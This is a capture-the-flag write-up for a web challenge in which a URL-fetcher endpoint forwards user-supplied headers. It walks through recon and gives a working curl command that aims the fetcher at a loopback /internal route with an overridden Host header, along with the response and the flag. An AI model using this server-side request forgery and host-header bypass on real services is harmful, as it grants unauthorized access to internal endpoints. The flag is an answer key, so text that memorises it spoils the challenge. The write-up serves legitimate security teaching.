# Who Are You, Really

## Category
Web

## Summary
The app exposes a URL fetcher at `/fetch`. A hidden route, `/internal`, is protected by host-based trust. The fetcher also accepts a JSON `headers` object and forwards those headers to the target request. By sending the fetcher to the loopback listener on `127.0.0.1:8000` and overriding `Host` to `internal.service`, the internal route trusts the request and returns the flag.

## Recon
The root page only returned:

```text
Welcome to the URL fetcher service!
```

`/fetch` existed and only accepted `POST` with JSON:

```http
POST /fetch
Content-Type: application/json
```

Basic testing showed it expected a `url` field:

```json
{"url":"http://example.com"}
```

The public route `/internal` existed but returned `403 Access Denied`.

## Key Findings
1. The app had an internal listener on loopback `127.0.0.1:8000`.
2. `/fetch` did not just accept `url`; it also forwarded a JSON `headers` object.
3. The `/internal` route trusted a specific `Host` header value: `internal.service`.

I confirmed header forwarding with `httpbin` by sending a custom `X-Test` header through `/fetch`.

## Exploit
Use the fetcher to request the internal route directly and override `Host`:

```bash
curl -sS \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8000/internal","headers":{"Host":"internal.service"}}' \
  http://chall-301f1443.evt-209.labs-for-vishwa.ctf7.com/fetch
```

Response:

```json
{"content":"Welcome internal user! Flag: VishaCTF{h057_h34d3r_4u7h_byp455_5905e242}","status":200}
```

## Flag

```text
VishaCTF{h057_h34d3r_4u7h_byp455_5905e242}
```
